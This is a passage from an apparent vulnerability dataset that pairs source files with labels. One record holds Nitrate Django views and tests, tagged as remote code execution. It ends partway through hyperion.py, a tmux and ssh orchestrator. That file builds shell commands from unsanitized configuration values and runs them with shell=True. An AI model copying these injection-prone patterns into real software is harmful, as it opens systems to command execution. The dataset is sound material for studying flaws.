logic.\n    \"\"\"\n\n    ctype = 'testcases.testcase'\n\n    def __init__(self, request):\n        self.request = request\n        self.target_field = request.POST.get('target_field')\n        self.new_value = request.POST.get('new_value')\n\n    def get_update_action(self):\n        return getattr(self, '_update_%s' % self.target_field, None)\n\n    def update(self):\n        has_perms = check_permission(self.request, self.ctype)\n        if not has_perms:\n            return say_no(\"You don't have enough permission to update TestCases.\")\n\n        action = self.get_update_action()\n        if action is not None:\n            try:\n                resp = action()\n                self._sendmail()\n            except ObjectDoesNotExist as err:\n                return say_no(str(err))\n            except Exception:\n                # TODO: besides this message to users, what happening should be\n                # recorded in the system log.\n                return say_no('Update failed. Please try again or request '\n                              'support from your organization.')\n            else:\n                if resp is None:\n                    resp = say_yes()\n                return resp\n        return say_no('Not know what to update.')\n\n    def get_update_targets(self):\n        \"\"\"Get selected cases to update their properties\"\"\"\n        case_ids = map(int, self.request.POST.getlist('case'))\n        self._update_objects = TestCase.objects.filter(pk__in=case_ids)\n        return self._update_objects\n\n    def get_plan(self, pk_enough=True):\n        try:\n            return plan_from_request_or_none(self.request, pk_enough)\n        except Http404:\n            return None\n\n    def _sendmail(self):\n        mail_context = TestCase.mail_scene(objects=self._update_objects,\n                                           field=self.target_field,\n                                           value=self.new_value)\n        if mail_context:\n            from tcms.core.utils.mailto import mailto\n\n            mail_context['context']['user'] = self.request.user\n            try:\n                mailto(**mail_context)\n            except Exception:  # nosec:B110:try_except_pass\n                pass\n\n    def _update_priority(self):\n        exists = Priority.objects.filter(pk=self.new_value).exists()\n        if not exists:\n            raise ObjectDoesNotExist('The priority you specified to change '\n                                     'does not exist.')\n        self.get_update_targets().update(**{str(self.target_field): self.new_value})\n\n    def _update_default_tester(self):\n        try:\n            user = User.objects.get(Q(username=self.new_value) | Q(email=self.new_value))\n        except User.DoesNotExist:\n            raise ObjectDoesNotExist('Default tester not found!')\n        self.get_update_targets().update(**{str(self.target_field): user.pk})\n\n    def _update_case_status(self):\n        try:\n            new_status = TestCaseStatus.objects.get(pk=self.new_value)\n        except TestCaseStatus.DoesNotExist:\n            raise ObjectDoesNotExist('The status you choose does not exist.')\n\n        update_object = self.get_update_targets()\n        if not update_object:\n            return say_no('No record(s) found')\n\n        for testcase in update_object:\n            if hasattr(testcase, 'log_action'):\n                testcase.log_action(\n                    who=self.request.user,\n                    action='Field %s changed from %s to %s.' % (\n                        self.target_field, testcase.case_status, new_status.name\n                    )\n                )\n        update_object.update(**{str(self.target_field): self.new_value})\n\n        # ###\n        # Case is moved between Cases and Reviewing Cases tabs accoding to the\n        # change of status. Meanwhile, the number of cases with each status\n        # should be updated also.\n\n        try:\n            plan = plan_from_request_or_none(self.request)\n        except Http404:\n            return say_no(\"No plan record found.\")\n        else:\n            if plan is None:\n                return say_no('No plan record found.')\n\n        confirm_status_name = 'CONFIRMED'\n        plan.run_case = plan.case.filter(case_status__name=confirm_status_name)\n        plan.review_case = plan.case.exclude(case_status__name=confirm_status_name)\n        run_case_count = plan.run_case.count()\n        case_count = plan.case.count()\n        # FIXME: why not calculate review_case_count or run_case_count by using\n        # substraction, which saves one SQL query.\n        review_case_count = plan.review_case.count()\n\n        return http.JsonResponse({\n            'rc': 0, 'response': 'ok',\n            'run_case_count': run_case_count,\n            'case_count': case_count,\n            'review_case_count': review_case_count,\n        })\n\n    def _update_sortkey(self):\n        try:\n            sortkey = int(self.new_value)\n            if sortkey < 0 or sortkey > 32300:\n                return say_no('New sortkey is out of range [0, 32300].')\n        except ValueError:\n            return say_no('New sortkey is not an integer.')\n        plan = plan_from_request_or_none(self.request, pk_enough=True)\n        if plan is None:\n            return say_no('No plan record found.')\n        update_targets = self.get_update_targets()\n\n        # ##\n        # MySQL does not allow to exeucte UPDATE statement that contains\n        # subquery querying from same table. In this case, OperationError will\n        # be raised.\n        offset = 0\n        step_length = 500\n        queryset_filter = TestCasePlan.objects.filter\n        data = {self.target_field: sortkey}\n        while 1:\n            sub_cases = update_targets[offset:offset + step_length]\n            case_pks = [case.pk for case in sub_cases]\n            if len(case_pks) == 0:\n                break\n            queryset_filter(plan=plan, case__in=case_pks).update(**data)\n            # Move to next batch of cases to change.\n            offset += step_length\n\n    def _update_reviewer(self):\n        reviewers = User.objects.filter(username=self.new_value).values_list('pk', flat=True)\n        if not reviewers:\n            err_msg = 'Reviewer %s is not found' % self.new_value\n            raise ObjectDoesNotExist(err_msg)\n        self.get_update_targets().update(**{str(self.target_field): reviewers[0]})\n\n\n# NOTE: what permission is necessary\n# FIXME: find a good chance to map all TestCase property change request to this\n@require_POST\ndef update_cases_default_tester(request):\n    \"\"\"Update default tester upon selected TestCases\"\"\"\n    proxy = TestCaseUpdateActions(request)\n    return proxy.update()\n\n\nupdate_cases_priority = update_cases_default_tester\nupdate_cases_case_status = update_cases_default_tester\nupdate_cases_sortkey = update_cases_default_tester\nupdate_cases_reviewer = update_cases_default_tester\n\n\n@require_POST\ndef comment_case_runs(request):\n    \"\"\"\n    Add comment to one or more caseruns at a time.\n    \"\"\"\n    data = request.POST.copy()\n    comment = data.get('comment', None)\n    if not comment:\n        return say_no('Comments needed')\n    run_ids = [i for i in data.get('run', '').split(',') if i]\n    if not run_ids:\n        return say_no('No runs selected.')\n    runs = TestCaseRun.objects.filter(pk__in=run_ids).only('pk')\n    if not runs:\n        return say_no('No caserun found.')\n    add_comment(runs, comment, request.user)\n    return say_yes()\n\n\ndef clean_bug_form(request):\n    \"\"\"\n    Verify the form data, return a tuple\\n\n    (None, ERROR_MSG) on failure\\n\n    or\\n\n    (data_dict, '') on success.\\n\n    \"\"\"\n    data = {}\n    try:\n        data['bugs'] = request.GET.get('bug_id', '').split(',')\n        data['runs'] = map(int, request.GET.get('case_runs', '').split(','))\n    except (TypeError, ValueError) as e:\n        return (None, 'Please specify only integers for bugs, '\n                      'caseruns(using comma to seperate IDs), '\n                      'and bug_system. (DEBUG INFO: %s)' % str(e))\n\n    data['bug_system_id'] = int(request.GET.get('bug_system_id', 1))\n\n    if request.GET.get('a') not in ('add', 'remove'):\n        return (None, 'Actions only allow \"add\" and \"remove\".')\n    else:\n        data['action'] = request.GET.get('a')\n    data['bz_external_track'] = True if request.GET.get('bz_external_track',\n                                                        False) else False\n\n    return (data, '')\n\n\ndef update_bugs_to_caseruns(request):\n    \"\"\"\n    Add one or more bugs to or remove that from\\n\n    one or more caserun at a time.\n    \"\"\"\n    data, error = clean_bug_form(request)\n    if error:\n        return say_no(error)\n    runs = TestCaseRun.objects.filter(pk__in=data['runs'])\n    bug_system_id = data['bug_system_id']\n    bug_ids = data['bugs']\n\n    try:\n        validate_bug_id(bug_ids, bug_system_id)\n    except ValidationError as e:\n        return say_no(str(e))\n\n    bz_external_track = data['bz_external_track']\n    action = data['action']\n    try:\n        if action == \"add\":\n            for run in runs:\n                for bug_id in bug_ids:\n                    run.add_bug(bug_id=bug_id,\n                                bug_system_id=bug_system_id,\n                                bz_external_track=bz_external_track)\n        else:\n            bugs = Bug.objects.filter(bug_id__in=bug_ids)\n            for run in runs:\n                for bug in bugs:\n                    if bug.case_run_id == run.pk:\n                        run.remove_bug(bug.bug_id, run.pk)\n    except Exception as e:\n        return say_no(str(e))\n    return say_yes()\n\n\ndef get_prod_related_objs(p_pks, target):\n    \"\"\"\n    Get Component, Version, Category, and Build\\n\n    Return [(id, name), (id, name)]\n    \"\"\"\n    ctypes = {\n        'component': (Component, 'name'),\n        'version': (Version, 'value'),\n        'build': (Build, 'name'),\n        'category': (Category, 'name'),\n    }\n    results = ctypes[target][0]._default_manager.filter(product__in=p_pks)\n    attr = ctypes[target][1]\n    results = [(r.pk, getattr(r, attr)) for r in results]\n    return results\n\n\ndef get_prod_related_obj_json(request):\n    \"\"\"\n    View for updating product drop-down\\n\n    in a Ajax way.\n    \"\"\"\n    data = request.GET.copy()\n    target = data.get('target', None)\n    p_pks = data.get('p_ids', None)\n    sep = data.get('sep', None)\n    # py2.6: all(*values) => boolean ANDs\n    if target and p_pks and sep:\n        p_pks = [k for k in p_pks.split(sep) if k]\n        res = get_prod_related_objs(p_pks, target)\n    else:\n        res = []\n    return HttpResponse(json.dumps(res))\n\n\ndef objects_update(objects, **kwargs):\n    objects.update(**kwargs)\n    kwargs['instances'] = objects\n    if objects.model.__name__ == TestCaseRun.__name__ and kwargs.get(\n            'case_run_status', None):\n        POST_UPDATE_SIGNAL.send(sender=None, **kwargs)\n/n/n/n/tcms/core/tests/test_views.py/n/n# -*- coding: utf-8 -*-\n\nimport json\nfrom http import HTTPStatus\nfrom urllib.parse import urlencode\n\nfrom django import test\nfrom django.conf import settings\nfrom django.contrib.contenttypes.models import ContentType\nfrom django.core import serializers\nfrom django.urls import reverse\nfrom django_comments.models import Comment\n\nfrom tcms.management.models import Priority\nfrom tcms.management.models import EnvGroup\nfrom tcms.management.models import EnvProperty\nfrom tcms.testcases.forms import CaseAutomatedForm\nfrom tcms.testcases.forms import TestCase\nfrom tcms.testplans.models import TestPlan\nfrom tcms.testruns.models import TestCaseRun\nfrom tcms.testruns.models import TestCaseRunStatus\nfrom tcms.tests import BaseCaseRun\nfrom tcms.tests import BasePlanCase\nfrom tcms.tests import remove_perm_from_user\nfrom tcms.tests import user_should_have_perm\nfrom tcms.tests.factories import UserFactory\nfrom tcms.tests.factories import EnvGroupFactory\nfrom tcms.tests.factories import EnvGroupPropertyMapFactory\nfrom tcms.tests.factories import EnvPropertyFactory\n\n\nclass TestNavigation(test.TestCase):\n    @classmethod\n    def setUpTestData(cls):\n        super(TestNavigation, cls).setUpTestData()\n        cls.user = UserFactory(email='user+1@example.com')\n        cls.user.set_password('testing')\n        cls.user.save()\n\n    def test_urls_for_emails_with_pluses(self):\n        # test for https://github.com/Nitrate/Nitrate/issues/262\n        # when email contains + sign it needs to be properly urlencoded\n        # before passing it as query string argument to the search views\n        self.client.login(  # nosec:B106:hardcoded_password_funcarg\n            username=self.user.username,\n            password='testing')\n        response = self.client.get(reverse('iframe-navigation'))\n\n        self.assertContains(response, urlencode({'people': self.user.email}))\n        self.assertContains(response, urlencode({'author__email__startswith': self.user.email}))\n\n\nclass TestIndex(BaseCaseRun):\n    def test_when_not_logged_in_index_page_redirects_to_login(self):\n        response = self.client.get(reverse('core-views-index'))\n        self.assertRedirects(\n            response,\n            reverse('tcms-login'),\n            target_status_code=HTTPStatus.OK)\n\n    def test_when_logged_in_index_page_redirects_to_dashboard(self):\n        self.client.login(  # nosec:B106:hardcoded_password_funcarg\n            username=self.tester.username,\n            password='password')\n        response = self.client.get(reverse('core-views-index'))\n        self.assertRedirects(\n            response,\n            reverse('tcms-recent', args=[self.tester.username]),\n            target_status_code=HTTPStatus.OK)\n\n\nclass TestCommentCaseRuns(BaseCaseRun):\n    \"\"\"Test case for ajax.comment_case_runs\"\"\"\n\n    @classmethod\n    def setUpTestData(cls):\n        super(TestCommentCaseRuns, cls).setUpTestData()\n        cls.many_comments_url = reverse('ajax-comment_case_runs')\n\n    def test_refuse_if_missing_comment(self):\n        self.client.login(  # nosec:B106:hardcoded_password_funcarg\n            username=self.tester.username,\n            password='password')\n\n        response = self.client.post(self.many_comments_url,\n                                    {'run': [self.case_run_1.pk, self.case_run_2.pk]})\n        self.assertJSONEqual(\n            str(response.content, encoding=settings.DEFAULT_CHARSET),\n            {'rc': 1, 'response': 'Comments needed'})\n\n    def test_refuse_if_missing_no_case_run_pk(self):\n        self.client.login(  # nosec:B106:hardcoded_password_funcarg\n            username=self.tester.username,\n            password='password')\n\n        response = self.client.post(self.many_comments_url,\n                                    {'comment': 'new comment', 'run': []})\n        self.assertJSONEqual(\n            str(response.content, encoding=settings.DEFAULT_CHARSET),\n            {'rc': 1, 'response': 'No runs selected.'})\n\n        response = self.client.post(self.many_comments_url,\n                                    {'comment': 'new comment'})\n        self.assertJSONEqual(\n            str(response.content, encoding=settings.DEFAULT_CHARSET),\n            {'rc': 1, 'response': 'No runs selected.'})\n\n    def test_refuse_if_passed_case_run_pks_not_exist(self):\n        self.client.login(  # nosec:B106:hardcoded_password_funcarg\n            username=self.tester.username,\n            password='password')\n\n        response = self.client.post(self.many_comments_url,\n                                    {'comment': 'new comment',\n                                     'run': '99999998,1009900'})\n        self.assertJSONEqual(\n            str(response.content, encoding=settings.DEFAULT_CHARSET),\n            {'rc': 1, 'response': 'No caserun found.'})\n\n    def test_add_comment_to_case_runs(self):\n        self.client.login(  # nosec:B106:hardcoded_password_funcarg\n            username=self.tester.username,\n            password='password')\n\n        new_comment = 'new comment'\n        response = self.client.post(\n            self.many_comments_url,\n            {'comment': new_comment,\n             'run': ','.join([str(self.case_run_1.pk),\n                              str(self.case_run_2.pk)])})\n        self.assertJSONEqual(\n            str(response.content, encoding=settings.DEFAULT_CHARSET),\n            {'rc': 0, 'response': 'ok'})\n\n        # Assert comments are added\n        case_run_ct = ContentType.objects.get_for_model(TestCaseRun)\n\n        for case_run_pk in (self.case_run_1.pk, self.case_run_2.pk):\n            comments = Comment.objects.filter(object_pk=case_run_pk,\n                                              content_type=case_run_ct)\n            self.assertEqual(new_comment, comments[0].comment)\n            self.assertEqual(self.tester, comments[0].user)\n\n\nclass TestUpdateObject(BasePlanCase):\n    \"\"\"Test case for update\"\"\"\n\n    @classmethod\n    def setUpTestData(cls):\n        super(TestUpdateObject, cls).setUpTestData()\n\n        cls.permission = 'testplans.change_testplan'\n        cls.update_url = reverse('ajax-update')\n\n    def setUp(self):\n        user_should_have_perm(self.tester, self.permission)\n\n    def test_refuse_if_missing_permission(self):\n        self.client.login(  # nosec:B106:hardcoded_password_funcarg\n            username=self.tester.username,\n            password='password')\n\n        remove_perm_from_user(self.tester, self.permission)\n\n        post_data = {\n            'content_type': 'testplans.testplan',\n            'object_pk': self.plan.pk,\n            'field': 'is_active',\n            'value': 'False',\n            'value_type': 'bool'\n        }\n\n        response = self.client.post(self.update_url, post_data)\n\n        self.assertJSONEqual(\n            str(response.content, encoding=settings.DEFAULT_CHARSET),\n            {'rc': 1, 'response': 'Permission Dinied.'})\n\n    def test_update_plan_is_active(self):\n        self.client.login(  # nosec:B106:hardcoded_password_funcarg\n            username=self.tester.username,\n            password='password')\n\n        post_data = {\n            'content_type': 'testplans.testplan',\n            'object_pk': self.plan.pk,\n            'field': 'is_active',\n            'value': 'False',\n            'value_type': 'bool'\n        }\n\n        response = self.client.post(self.update_url, post_data)\n\n        self.assertJSONEqual(\n            str(response.content, encoding=settings.DEFAULT_CHARSET),\n            {'rc': 0, 'response': 'ok'})\n        plan = TestPlan.objects.get(pk=self.plan.pk)\n        self.assertFalse(plan.is_active)\n\n\nclass TestUpdateCaseRunStatus(BaseCaseRun):\n    \"\"\"Test case for update_case_run_status\"\"\"\n\n    @classmethod\n    def setUpTestData(cls):\n        super(TestUpdateCaseRunStatus, cls).setUpTestData()\n\n        cls.permission = 'testruns.change_testcaserun'\n        cls.update_url = reverse('ajax-update_case_run_status')\n\n    def setUp(self):\n        user_should_have_perm(self.tester, self.permission)\n\n    def test_refuse_if_missing_permission(self):\n        remove_perm_from_user(self.tester, self.permission)\n        self.client.login(  # nosec:B106:hardcoded_password_funcarg\n            username=self.tester.username,\n            password='password')\n\n        response = self.client.post(self.update_url, {\n            'content_type': 'testruns.testcaserun',\n            'object_pk': self.case_run_1.pk,\n            'field': 'case_run_status',\n            'value': str(TestCaseRunStatus.objects.get(name='PAUSED').pk),\n            'value_type': 'int',\n        })\n\n        self.assertJSONEqual(\n            str(response.content, encoding=settings.DEFAULT_CHARSET),\n            {'rc': 1, 'response': 'Permission Dinied.'})\n\n    def test_change_case_run_status(self):\n        self.client.login(  # nosec:B106:hardcoded_password_funcarg\n            username=self.tester.username,\n            password='password')\n\n        response = self.client.post(self.update_url, {\n            'content_type': 'testruns.testcaserun',\n            'object_pk': self.case_run_1.pk,\n            'field': 'case_run_status',\n            'value': str(TestCaseRunStatus.objects.get(name='PAUSED').pk),\n            'value_type': 'int',\n        })\n\n        self.assertJSONEqual(\n            str(response.content, encoding=settings.DEFAULT_CHARSET),\n            {'rc': 0, 'response': 'ok'})\n        self.assertEqual(\n            'PAUSED', TestCaseRun.objects.get(pk=self.case_run_1.pk).case_run_status.name)\n\n\nclass TestGetForm(test.TestCase):\n    \"\"\"Test case for form\"\"\"\n\n    def test_get_form(self):\n        response = self.client.get(reverse('ajax-form'),\n                                   {'app_form': 'testcases.CaseAutomatedForm'})\n        form = CaseAutomatedForm()\n        self.assertHTMLEqual(str(response.content, encoding=settings.DEFAULT_CHARSET), form.as_p())\n\n\nclass TestUpdateCasePriority(BasePlanCase):\n    \"\"\"Test case for update_cases_default_tester\"\"\"\n\n    @classmethod\n    def setUpTestData(cls):\n        super(TestUpdateCasePriority, cls).setUpTestData()\n\n        cls.permission = 'testcases.change_testcase'\n        cls.case_update_url = reverse('ajax-update_cases_default_tester')\n\n    def setUp(self):\n        user_should_have_perm(self.tester, self.permission)\n\n    def test_refuse_if_missing_permission(self):\n        remove_perm_from_user(self.tester, self.permission)\n        self.client.login(  # nosec:B106:hardcoded_password_funcarg\n            username=self.tester.username,\n            password='password')\n\n        response = self.client.post(\n            self.case_update_url,\n            {\n                'target_field': 'priority',\n                'from_plan': self.plan.pk,\n                'case': [self.case_1.pk, self.case_3.pk],\n                'new_value': Priority.objects.get(value='P3').pk,\n            })\n\n        self.assertJSONEqual(\n            str(response.content, encoding=settings.DEFAULT_CHARSET),\n            {'rc': 1, 'response': \"You don't have enough permission to \"\n                                  \"update TestCases.\"})\n\n    def test_update_case_priority(self):\n        self.client.login(  # nosec:B106:hardcoded_password_funcarg\n            username=self.tester.username,\n            password='password')\n\n        response = self.client.post(\n            self.case_update_url,\n            {\n                'target_field': 'priority',\n                'from_plan': self.plan.pk,\n                'case': [self.case_1.pk, self.case_3.pk],\n                'new_value': Priority.objects.get(value='P3').pk,\n            })\n\n        self.assertJSONEqual(\n            str(response.content, encoding=settings.DEFAULT_CHARSET),\n            {'rc': 0, 'response': 'ok'})\n\n        for pk in (self.case_1.pk, self.case_3.pk):\n            self.assertEqual('P3', TestCase.objects.get(pk=pk).priority.value)\n\n\nclass TestGetObjectInfo(BasePlanCase):\n    \"\"\"Test case for info view method\"\"\"\n\n    @classmethod\n    def setUpTestData(cls):\n        super(TestGetObjectInfo, cls).setUpTestData()\n\n        cls.get_info_url = reverse('ajax-info')\n\n        cls.group_nitrate = EnvGroupFactory(name='nitrate')\n        cls.group_new = EnvGroupFactory(name='NewGroup')\n\n        cls.property_os = EnvPropertyFactory(name='os')\n        cls.property_python = EnvPropertyFactory(name='python')\n        cls.property_django = EnvPropertyFactory(name='django')\n\n        EnvGroupPropertyMapFactory(group=cls.group_nitrate,\n                                   property=cls.property_os)\n        EnvGroupPropertyMapFactory(group=cls.group_nitrate,\n                                   property=cls.property_python)\n        EnvGroupPropertyMapFactory(group=cls.group_new,\n                                   property=cls.property_django)\n\n    def test_get_env_properties(self):\n        response = self.client.get(self.get_info_url, {'info_type': 'env_properties'})\n\n        expected_json = json.loads(\n            serializers.serialize(\n                'json',\n                EnvProperty.objects.all(),\n                fields=('name', 'value')))\n        self.assertJSONEqual(\n            str(response.content, encoding=settings.DEFAULT_CHARSET),\n            expected_json)\n\n    def test_get_env_properties_by_group(self):\n        response = self.client.get(self.get_info_url,\n                                   {'info_type': 'env_properties',\n                                    'env_group_id': self.group_new.pk})\n\n        group = EnvGroup.objects.get(pk=self.group_new.pk)\n        expected_json = json.loads(\n            serializers.serialize(\n                'json',\n                group.property.all(),\n                fields=('name', 'value')))\n        self.assertJSONEqual(\n            str(response.content, encoding=settings.DEFAULT_CHARSET),\n            expected_json)\n/n/n/n", "label": 1, "vtype": "remote_code_execution"}, {"id": "269b8c87afc149911af3ae63b3ccbfc77ffb223d", "code": "hyperion/hyperion.py/n/n#! /usr/bin/env python\nfrom libtmux import Server\nfrom yaml import load, dump\nfrom setupParser import Loader\nfrom DepTree import Node, dep_resolve, CircularReferenceException\nimport logging\nimport os\nimport socket\nimport argparse\nfrom psutil import Process\nfrom subprocess import call\nfrom graphviz import Digraph\nfrom enum import Enum\nfrom time import sleep\n\nimport sys\nfrom PyQt4 import QtGui\nimport hyperGUI\n\nFORMAT = \"%(asctime)s: %(name)s [%(levelname)s]:\\t%(message)s\"\n\nlogging.basicConfig(level=logging.WARNING, format=FORMAT, datefmt='%I:%M:%S')\nTMP_SLAVE_DIR = \"/tmp/Hyperion/slave/components\"\nTMP_COMP_DIR = \"/tmp/Hyperion/components\"\nTMP_LOG_PATH = \"/tmp/Hyperion/log\"\n\nBASE_DIR = os.path.dirname(__file__)\nSCRIPT_CLONE_PATH = (\"%s/scripts/start_named_clone_session.sh\" % BASE_DIR)\n\n\nclass CheckState(Enum):\n    RUNNING = 0\n    STOPPED = 1\n    STOPPED_BUT_SUCCESSFUL = 2\n    STARTED_BY_HAND = 3\n    DEP_FAILED = 4\n\n\nclass ControlCenter:\n\n    def __init__(self, configfile=None):\n        self.logger = logging.getLogger(__name__)\n        self.logger.setLevel(logging.DEBUG)\n        self.configfile = configfile\n        self.nodes = {}\n        self.server = []\n        self.host_list = []\n\n        if configfile:\n            self.load_config(configfile)\n            self.session_name = self.config[\"name\"]\n\n            # Debug write resulting yaml file\n            with open('debug-result.yml', 'w') as outfile:\n                dump(self.config, outfile, default_flow_style=False)\n            self.logger.debug(\"Loading config was successful\")\n\n            self.server = Server()\n\n            if self.server.has_session(self.session_name):\n                self.session = self.server.find_where({\n                    \"session_name\": self.session_name\n                })\n\n                self.logger.info('found running session by name \"%s\" on server' % self.session_name)\n            else:\n                self.logger.info('starting new session by name \"%s\" on server' % self.session_name)\n                self.session = self.server.new_session(\n                    session_name=self.session_name,\n                    window_name=\"Main\"\n                )\n        else:\n            self.config = None\n\n    ###################\n    # Setup\n    ###################\n    def load_config(self, filename=\"default.yaml\"):\n        with open(filename) as data_file:\n            self.config = load(data_file, Loader)\n\n    def init(self):\n        if not self.config:\n            self.logger.error(\" Config not loaded yet!\")\n\n        else:\n            for group in self.config['groups']:\n                for comp in group['components']:\n                    self.logger.debug(\"Checking component '%s' in group '%s' on host '%s'\" %\n                                      (comp['name'], group['name'], comp['host']))\n\n                    if comp['host'] != \"localhost\" and not self.run_on_localhost(comp):\n                        self.copy_component_to_remote(comp, comp['name'], comp['host'])\n\n            # Remove duplicate hosts\n            self.host_list = list(set(self.host_list))\n\n            self.set_dependencies(True)\n\n    def set_dependencies(self, exit_on_fail):\n        for group in self.config['groups']:\n            for comp in group['components']:\n                self.nodes[comp['name']] = Node(comp)\n\n        # Add a pseudo node that depends on all other nodes, to get a starting point to be able to iterate through all\n        # nodes with simple algorithms\n        master_node = Node({'name': 'master_node'})\n        for name in self.nodes:\n            node = self.nodes.get(name)\n\n            # Add edges from each node to pseudo node\n            master_node.addEdge(node)\n\n            # Add edges based on dependencies specified in the configuration\n            if \"depends\" in node.component:\n                for dep in node.component['depends']:\n                    if dep in self.nodes:\n                        node.addEdge(self.nodes[dep])\n                    else:\n                        self.logger.error(\"Unmet dependency: '%s' for component '%s'!\" % (dep, node.comp_name))\n                        if exit_on_fail:\n                            exit(1)\n        self.nodes['master_node'] = master_node\n\n        # Test if starting all components is possible\n        try:\n            node = self.nodes.get('master_node')\n            res = []\n            unres = []\n            dep_resolve(node, res, unres)\n            dep_string = \"\"\n            for node in res:\n                if node is not master_node:\n                    dep_string = \"%s -> %s\" % (dep_string, node.comp_name)\n            self.logger.debug(\"Dependency tree for start all: %s\" % dep_string)\n        except CircularReferenceException as ex:\n            self.logger.error(\"Detected circular dependency reference between %s and %s!\" % (ex.node1, ex.node2))\n            if exit_on_fail:\n                exit(1)\n\n    def copy_component_to_remote(self, infile, comp, host):\n        self.host_list.append(host)\n\n        self.logger.debug(\"Saving component to tmp\")\n        tmp_comp_path = ('%s/%s.yaml' % (TMP_COMP_DIR, comp))\n        ensure_dir(tmp_comp_path)\n        with open(tmp_comp_path, 'w') as outfile:\n            dump(infile, outfile, default_flow_style=False)\n\n        self.logger.debug('Copying component \"%s\" to remote host \"%s\"' % (comp, host))\n        cmd = (\"ssh %s 'mkdir -p %s' & scp %s %s:%s/%s.yaml\" %\n               (host, TMP_SLAVE_DIR, tmp_comp_path, host, TMP_SLAVE_DIR, comp))\n        self.logger.debug(cmd)\n        send_main_session_command(self.session, cmd)\n\n    ###################\n    # Stop\n    ###################\n    def stop_component(self, comp):\n        if comp['host'] != 'localhost' and not self.run_on_localhost(comp):\n            self.logger.debug(\"Stopping remote component '%s' on host '%s'\" % (comp['name'], comp['host']))\n            self.stop_remote_component(comp['name'], comp['host'])\n        else:\n            window = find_window(self.session, comp['name'])\n\n            if window:\n                self.logger.debug(\"window '%s' found running\" % comp['name'])\n                self.logger.info(\"Shutting down window...\")\n                kill_window(window)\n                self.logger.info(\"... done!\")\n\n    def stop_remote_component(self, comp_name, host):\n        # invoke Hyperion in slave mode on each remote host\n        cmd = (\"ssh %s 'hyperion --config %s/%s.yaml slave --kill'\" % (host, TMP_SLAVE_DIR, comp_name))\n        self.logger.debug(\"Run cmd:\\n%s\" % cmd)\n        send_main_session_command(self.session, cmd)\n\n    ###################\n    # Start\n    ###################\n    def start_component(self, comp):\n\n        node = self.nodes.get(comp['name'])\n        res = []\n        unres = []\n        dep_resolve(node, res, unres)\n        for node in res:\n            self.logger.debug(\"node name '%s' vs. comp name '%s'\" % (node.comp_name, comp['name']))\n            if node.comp_name != comp['name']:\n                self.logger.debug(\"Checking and starting %s\" % node.comp_name)\n                state = self.check_component(node.component)\n                if (state is CheckState.STOPPED_BUT_SUCCESSFUL or\n                        state is CheckState.STARTED_BY_HAND or\n                        state is CheckState.RUNNING):\n                    self.logger.debug(\"Component %s is already running, skipping to next in line\" % comp['name'])\n                else:\n                    self.logger.debug(\"Start component '%s' as dependency of '%s'\" % (node.comp_name, comp['name']))\n                    self.start_component_without_deps(node.component)\n\n                    tries = 0\n                    while True:\n                        self.logger.debug(\"Checking %s resulted in checkstate %s\" % (node.comp_name, state))\n                        state = self.check_component(node.component)\n                        if (state is not CheckState.RUNNING or\n                           state is not CheckState.STOPPED_BUT_SUCCESSFUL):\n                            break\n                        if tries > 100:\n                            return False\n                        tries = tries + 1\n                        sleep(.5)\n\n        self.logger.debug(\"All dependencies satisfied, starting '%s'\" % (comp['name']))\n        state = self.check_component(node.component)\n        if (state is CheckState.STARTED_BY_HAND or\n                state is CheckState.RUNNING):\n            self.logger.debug(\"Component %s is already running. Skipping start\" % comp['name'])\n        else:\n            self.start_component_without_deps(comp)\n        return True\n\n    def start_component_without_deps(self, comp):\n        if comp['host'] != 'localhost' and not self.run_on_localhost(comp):\n            self.logger.debug(\"Starting remote component '%s' on host '%s'\" % (comp['name'], comp['host']))\n            self.start_remote_component(comp['name'], comp['host'])\n        else:\n            log_file = (\"%s/%s\" % (TMP_LOG_PATH, comp['name']))\n            window = find_window(self.session, comp['name'])\n\n            if window:\n                self.logger.debug(\"Restarting '%s' in old window\" % comp['name'])\n                start_window(window, comp['cmd'][0]['start'], log_file, comp['name'])\n            else:\n                self.logger.info(\"creating window '%s'\" % comp['name'])\n                window = self.session.new_window(comp['name'])\n                start_window(window, comp['cmd'][0]['start'], log_file, comp['name'])\n\n    def start_remote_component(self, comp_name, host):\n        # invoke Hyperion in slave mode on each remote host\n        cmd = (\"ssh %s 'hyperion --config %s/%s.yaml slave'\" % (host, TMP_SLAVE_DIR, comp_name))\n        self.logger.debug(\"Run cmd:\\n%s\" % cmd)\n        send_main_session_command(self.session, cmd)\n\n    ###################\n    # Check\n    ###################\n    def check_component(self, comp):\n        if self.run_on_localhost(comp):\n            return check_component(comp, self.session, self.logger)\n        else:\n            self.logger.debug(\"Starting remote check\")\n            cmd = \"ssh %s 'hyperion --config %s/%s.yaml slave -c'\" % (comp['host'], TMP_SLAVE_DIR, comp['name'])\n            ret = call(cmd, shell=True)\n            return CheckState(ret)\n\n    ###################\n    # Dependency management\n    ###################\n    def get_dep_list(self, comp):\n        node = self.nodes.get(comp['name'])\n        res = []\n        unres = []\n        dep_resolve(node, res, unres)\n        res.remove(node)\n\n        return res\n\n    ###################\n    # Host related checks\n    ###################\n    def is_localhost(self, hostname):\n        try:\n            hn_out = socket.gethostbyname(hostname)\n            if hn_out == '127.0.0.1' or hn_out == '::1':\n                self.logger.debug(\"Host '%s' is localhost\" % hostname)\n                return True\n            else:\n                self.logger.debug(\"Host '%s' is not localhost\" % hostname)\n                return False\n        except socket.gaierror:\n            sys.exit(\"Host '%s' is unknown! Update your /etc/hosts file!\" % hostname)\n\n    def run_on_localhost(self, comp):\n        return self.is_localhost(comp['host'])\n\n    ###################\n    # TMUX\n    ###################\n    def kill_remote_session_by_name(self, name, host):\n        cmd = \"ssh -t %s 'tmux kill-session -t %s'\" % (host, name)\n        send_main_session_command(self.session, cmd)\n\n    def start_clone_session(self, comp_name, session_name):\n        cmd = \"%s '%s' '%s'\" % (SCRIPT_CLONE_PATH, session_name, comp_name)\n        send_main_session_command(self.session, cmd)\n\n    def start_remote_clone_session(self, comp_name, session_name, hostname):\n        remote_cmd = (\"%s '%s' '%s'\" % (SCRIPT_CLONE_PATH, session_name, comp_name))\n        cmd = \"ssh %s 'bash -s' < %s\" % (hostname, remote_cmd)\n        send_main_session_command(self.session, cmd)\n\n    ###################\n    # Visualisation\n    ###################\n    def draw_graph(self):\n        deps = Digraph(\"Deps\", strict=True)\n        deps.graph_attr.update(rankdir=\"BT\")\n        try:\n            node = self.nodes.get('master_node')\n\n            for current in node.depends_on:\n                deps.node(current.comp_name)\n\n                res = []\n                unres = []\n                dep_resolve(current, res, unres)\n                for node in res:\n                    if \"depends\" in node.component:\n                        for dep in node.component['depends']:\n                            if dep not in self.nodes:\n                                deps.node(dep, color=\"red\")\n                                